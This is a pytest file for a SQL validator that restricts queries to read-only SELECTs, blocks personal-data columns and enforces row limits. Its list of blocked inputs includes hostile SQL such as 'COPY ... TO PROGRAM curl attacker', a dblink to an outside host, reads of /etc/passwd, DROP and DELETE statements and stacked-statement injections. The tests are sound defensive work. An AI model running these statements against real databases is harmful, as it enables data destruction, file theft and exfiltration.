"""The sqlglot validator: one read-only SELECT over allow-listed tables and columns, no PII, allow-listed functions,
LIMIT enforced. No database needed: the schema comes from a saved catalog of the demo database."""

from __future__ import annotations

import datetime as dt
import json
from pathlib import Path

import pytest

from tally.schema.catalog import Catalog
from tally.schema.semantic import load_semantic_layer
from tally.sql.expand import expand_views
from tally.sql.validator import SQLValidator, allowed_function_classes

ROOT = Path(__file__).resolve().parents[1]
CATALOG = Catalog.from_json(json.loads((ROOT / "tests/fixtures/catalog.json").read_text()))
LAYER = load_semantic_layer(ROOT / "configs/semantic_layer.yaml")
VIEWS = {name: view.sql for name, view in LAYER.semantic_views.items()}


@pytest.fixture(scope="module")
def validator() -> SQLValidator:
    return SQLValidator(schema=CATALOG.sqlglot_schema(), pii=CATALOG.pii, max_rows=1000)


def codes(validator: SQLValidator, sql: str) -> list[str]:
    return [v.code for v in validator.validate(sql).violations]


SAFE = [
    "SELECT count(*) FROM orders",
    "SELECT c.name, c.city FROM customers c WHERE c.segment = 'business'",
    "SELECT region_id, count(*) AS n FROM customers GROUP BY region_id ORDER BY n DESC",
    "WITH m AS (SELECT date_trunc('month', ordered_at) AS month, count(*) AS n FROM orders GROUP BY 1) "
    "SELECT month, n, n - lag(n) OVER (ORDER BY month) AS diff FROM m",
    "SELECT o.id FROM orders o WHERE EXISTS (SELECT 1 FROM refunds r WHERE r.order_id = o.id)",
    "SELECT p.name, sum(oi.quantity) FROM order_items oi JOIN products p ON p.id = oi.product_id GROUP BY 1",
    "SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY amount) FROM payments",
    "SELECT count(*) FILTER (WHERE status = 'cancelled') FROM orders",
    "SELECT extract(hour FROM ordered_at AT TIME ZONE 'Asia/Tokyo') AS h, count(*) FROM orders GROUP BY 1",
    "SELECT d::date FROM generate_series(DATE '2026-01-01', DATE '2026-03-01', INTERVAL '1 month') AS g(d)",
    "SELECT CASE WHEN satisfaction_score >= 4 THEN 'happy' ELSE 'other' END, count(*) FROM support_tickets GROUP BY 1",
    "SELECT coalesce(campaign_id, 0), nullif(shipping_fee, 0) FROM orders",
    "SELECT name FROM products WHERE name ILIKE '%lamp%' AND name ~ 'Desk'",
    "SELECT public.orders.id FROM public.orders",
    "SELECT id FROM orders UNION ALL SELECT id FROM refunds",
    "SELECT round(avg(list_price_usd)::numeric, 2) FROM products",
    "SELECT to_char(ordered_at, 'YYYY-MM'), count(*) FROM orders GROUP BY 1",
    "SELECT c.id, (SELECT count(*) FROM orders o WHERE o.customer_id = c.id) AS orders FROM customers c",
    "SELECT id FROM orders /* a comment ; DROP TABLE orders */ WHERE id < 10",
    "SELECT id FROM orders -- trailing comment",
]

UNSAFE = [
    # writes and DDL, alone, chained or hidden in a CTE
    ("DELETE FROM orders", "not_select"),
    ("UPDATE products SET list_price_usd = 0", "not_select"),
    ("INSERT INTO campaigns (id, name) VALUES (1, 'x')", "not_select"),
    ("DROP TABLE orders", "not_select"),
    ("TRUNCATE orders", "not_select"),
    ("ALTER TABLE orders ADD COLUMN x int", "not_select"),
    ("CREATE TABLE x AS SELECT * FROM orders", "not_select"),
    ("SELECT 1; DROP TABLE orders", "multiple_statements"),
    ("SELECT 1;DELETE FROM orders;", "multiple_statements"),
    ("SELECT 1 --\n; DROP TABLE orders", "multiple_statements"),
    ("WITH d AS (DELETE FROM orders RETURNING id) SELECT * FROM d", "write_or_ddl"),
    ("WITH u AS (UPDATE orders SET status = 'x' RETURNING id) SELECT count(*) FROM u", "write_or_ddl"),
    ("SELECT * INTO backup FROM orders", "write_or_ddl"),
    ("SELECT * FROM orders FOR UPDATE", "write_or_ddl"),
    ("COPY orders TO '/tmp/orders.csv'", "not_select"),
    ("COPY (SELECT * FROM orders) TO PROGRAM 'curl attacker'", "not_select"),
    ("SET ROLE tally", "not_select"),
    ("GRANT ALL ON orders TO public", "not_select"),
    ("BEGIN", "not_select"),
    ("EXPLAIN ANALYZE SELECT 1", "not_select"),
    # functions that sleep, reach outside, or change settings
    ("SELECT pg_sleep(10)", "function_not_allowed"),
    ("SELECT pg_sleep_for('5 minutes')", "function_not_allowed"),
    ("SELECT dblink('host=evil', 'SELECT 1')", "function_not_allowed"),
    ("SELECT set_config('tally.region_scope', '*', false)", "function_not_allowed"),
    ("SELECT current_setting('is_superuser')", "function_not_allowed"),
    ("SELECT pg_read_file('/etc/passwd')", "function_not_allowed"),
    ("SELECT lo_import('/etc/passwd')", "function_not_allowed"),
    ("SELECT query_to_xml('SELECT * FROM customers', true, true, '')", "function_not_allowed"),
    ("SELECT pg_terminate_backend(1)", "function_not_allowed"),
    ("SELECT id FROM orders WHERE id = (SELECT pg_sleep(1))::int", "function_not_allowed"),
    # system catalogs and other schemas
    ("SELECT * FROM pg_catalog.pg_authid", "system_table"),
    ("SELECT * FROM pg_user", "system_table"),
    ("SELECT * FROM information_schema.tables", "system_table"),
    ("SELECT * FROM tally.audit_log", "schema_not_allowed"),
    # personal data: direct, quoted, through a CTE, functions, filters, unions, whole-row references
    ("SELECT email FROM customers", "pii_column"),
    ('SELECT "email" FROM customers', "pii_column"),
    ('SELECT c."phone" FROM customers AS c', "pii_column"),
    ("SELECT upper(email) FROM customers", "pii_column"),
    ("SELECT md5(email) FROM customers", "function_not_allowed"),
    ("SELECT left(email, 3) FROM customers", "pii_column"),
    ("SELECT name FROM customers WHERE email LIKE '%@gmail.com'", "pii_column"),
    ("SELECT name FROM customers ORDER BY street_address", "pii_column"),
    ("WITH x AS (SELECT email AS e FROM customers) SELECT e FROM x", "pii_column"),
    ("SELECT name FROM customers UNION SELECT phone FROM customers", "pii_column"),
    (
        "SELECT o.id FROM orders o WHERE o.customer_id IN (SELECT id FROM customers WHERE phone IS NOT NULL)",
        "pii_column",
    ),
    ("SELECT c FROM customers c", "whole_row"),
    ("SELECT row_to_json(c) FROM customers c", "function_not_allowed"),
    ("SELECT to_jsonb(c.*) FROM customers c", "function_not_allowed"),
]

SOFT = [
    ("SELECT * FROM customers", "pii_via_star"),
    ("SELECT c.* FROM customers c", "pii_via_star"),
    ('SELECT "EMAIL" FROM customers', "unknown_column"),
    ("SELECT nonexistent FROM orders", "unknown_column"),
    ("SELECT * FROM no_such_table", "unknown_table"),
    ("SELEC id FROM orders", "parse_error"),
    ("", "empty"),
]


@pytest.mark.parametrize("sql", SAFE)
def test_safe_queries_pass(validator: SQLValidator, sql: str) -> None:
    result = validator.validate(sql)
    assert result.ok, result.violations


@pytest.mark.parametrize(("sql", "code"), UNSAFE)
def test_unsafe_queries_are_hard_blocked(validator: SQLValidator, sql: str, code: str) -> None:
    result = validator.validate(sql)
    assert not result.ok
    assert code in [v.code for v in result.violations]
    assert result.hard
    assert result.sql == ""


@pytest.mark.parametrize(("sql", "code"), SOFT)
def test_fixable_mistakes_are_soft(validator: SQLValidator, sql: str, code: str) -> None:
    result = validator.validate(sql)
    assert code in [v.code for v in result.violations]
    assert not result.hard


def test_limit_is_added_lowered_or_kept(validator: SQLValidator) -> None:
    added = validator.validate("SELECT id FROM orders")
    assert added.sql.endswith("LIMIT 1000") and added.limit_applied == 1000
    lowered = validator.validate("SELECT id FROM orders LIMIT 50000")
    assert lowered.sql.endswith("LIMIT 1000") and lowered.limit_applied == 1000
    kept = validator.validate("SELECT id FROM orders ORDER BY id LIMIT 10")
    assert kept.sql.endswith("LIMIT 10") and kept.limit_applied is None
    fetch = validator.validate("SELECT id FROM orders FETCH FIRST 5000 ROWS ONLY")
    assert "LIMIT 1000" in fetch.sql
    non_literal = validator.validate("SELECT id FROM orders LIMIT (SELECT 5000)")
    assert non_literal.sql.endswith("LIMIT 1000")
    union = validator.validate("SELECT id FROM orders UNION SELECT id FROM refunds")
    assert union.sql.endswith("LIMIT 1000")


def test_regenerated_sql_drops_comments(validator: SQLValidator) -> None:
    result = validator.validate("SELECT id /* ; DROP TABLE orders */ FROM orders -- ; DELETE")
    assert result.ok
    assert "DROP" not in result.sql and "DELETE" not in result.sql and "/*" not in result.sql


def test_reports_tables_columns_and_functions(validator: SQLValidator) -> None:
    result = validator.validate(
        "SELECT r.code, count(*) FROM orders o JOIN regions r ON r.id = o.region_id GROUP BY r.code"
    )
    assert result.tables == ["orders", "regions"]
    assert {"orders.region_id", "regions.id", "regions.code"} <= set(result.columns)
    assert "count" in result.functions


def test_today_is_pinned_when_configured() -> None:
    pinned = SQLValidator(schema=CATALOG.sqlglot_schema(), pii=CATALOG.pii, today=dt.date(2026, 10, 1))
    result = pinned.validate("SELECT count(*) FROM orders WHERE ordered_at >= CURRENT_DATE - 30 AND ordered_at < now()")
    assert result.ok and result.pinned_today
    assert "CURRENT_DATE" not in result.sql.upper() and "2026-10-01" in result.sql


def test_extra_functions_from_the_semantic_layer() -> None:
    assert "my_udf" not in allowed_function_classes()
    custom = SQLValidator(schema=CATALOG.sqlglot_schema(), pii=CATALOG.pii, extra_functions=["my_udf"])
    assert custom.validate("SELECT my_udf(id) FROM orders").ok


def test_every_semantic_view_expands_to_a_valid_query(validator: SQLValidator) -> None:
    for name in VIEWS:
        expanded = expand_views(f"SELECT * FROM {name}", VIEWS)
        assert expanded.views == [name]
        result = validator.validate(expanded.sql)
        assert result.ok, (name, result.violations)
        assert not any(c.split(".")[1] in {"email", "phone", "street_address"} for c in result.columns)


def test_a_view_cannot_smuggle_personal_data(validator: SQLValidator) -> None:
    leaky = {"order_revenue": "SELECT o.id, c.email FROM orders o JOIN customers c ON c.id = o.customer_id"}
    expanded = expand_views("SELECT * FROM order_revenue", leaky)
    assert "pii_column" in codes(validator, expanded.sql)


def test_expansion_merges_with_existing_ctes_and_respects_shadowing() -> None:
    merged = expand_views("WITH t AS (SELECT 1 AS x) SELECT * FROM t, order_revenue", VIEWS)
    assert merged.views == ["order_revenue"]
    assert merged.sql.upper().startswith("WITH ORDER_REVENUE AS")
    shadowed = expand_views("WITH order_revenue AS (SELECT 1 AS x) SELECT x FROM order_revenue", VIEWS)
    assert shadowed.views == []
    assert expand_views("not sql at all ((", VIEWS).views == []
    assert expand_views("SELECT 1; SELECT * FROM order_revenue", VIEWS).views == []
